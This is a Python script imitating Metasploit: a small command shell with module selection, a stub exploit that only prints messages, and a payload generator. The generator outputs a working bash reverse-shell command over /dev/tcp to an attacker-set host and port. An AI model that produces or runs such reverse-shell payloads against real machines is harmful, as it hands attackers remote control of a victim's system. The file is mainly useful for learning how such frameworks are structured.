# metasploit_clone.py

import cmd

# ====================== Exploit Module ======================

class SampleExploit:
    name = "Sample Exploit"
    description = "A demonstration exploit."

    def run(self, options):
        target = options.get("target", "127.0.0.1")
        payload = options.get("payload", "default")
        print(f"[+] Running {self.name} against {target}")
        print(f"[+] Payload: {payload}")
        # در اینجا می‌توانید کد واقعی Exploit قرار گیرد

# ====================== Payload Module ======================

class ReverseShell:
    name = "Reverse Shell"

    def generate(self, lhost, lport):
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

# ====================== Framework Core ======================

class Framework:
    def __init__(self):
        self.modules = {
            "exploit/sample": SampleExploit(),
            "payload/reverse_shell": ReverseShell()
        }
        self.current_module = None

    def use_module(self, name):
        if name in self.modules:
            self.current_module = self.modules[name]
            print(f"[+] Using module: {name}")
        else:
            print("[-] Module not found.")

    def run_current_module(self, options):
        if self.current_module:
            if hasattr(self.current_module, 'run'):
                self.current_module.run(options)
            elif hasattr(self.current_module, 'generate'):
                lhost = options.get("lhost", "127.0.0.1")
                lport = options.get("lport", "4444")
                payload_code = self.current_module.generate(lhost, lport)
                print(f"[+] Generated Payload:\n{payload_code}")
        else:
            print("[-] No module selected.")

# ====================== CLI Interface ======================

class CLI(cmd.Cmd):
    intro = "Welcome to Metasploit Clone. Type 'help' for commands.\n"
    prompt = "(msf) "

    def __init__(self):
        super().__init__()
        self.framework = Framework()
        self.options = {}

    def do_use(self, line):
        """use <module> - Select a module"""
        self.framework.use_module(line.strip())

    def do_show(self, line):
        """show modules - List available modules"""
        print("[*] Available modules:")
        for name in self.framework.modules:
            print(f"  {name}")

    def do_set(self, line):
        """set <key> <value> - Set an option"""
        try:
            key, value = line.split(" ", 1)
            self.options[key] = value
            print(f"[+] {key} => {value}")
        except Exception:
            print("[-] Usage: set <key> <value>")

    def do_exploit(self, line):
        """exploit - Run the selected module"""
        self.framework.run_current_module(self.options)

    def do_generate(self, line):
        """generate - Generate payload (if selected)"""
        self.framework.run_current_module(self.options)

    def do_exit(self, line):
        """exit - Exit the program"""
        print("[*] Goodbye!")
        return True

# ====================== Entry Point ======================

if __name__ == "__main__":
    cli = CLI()
    cli.cmdloop()
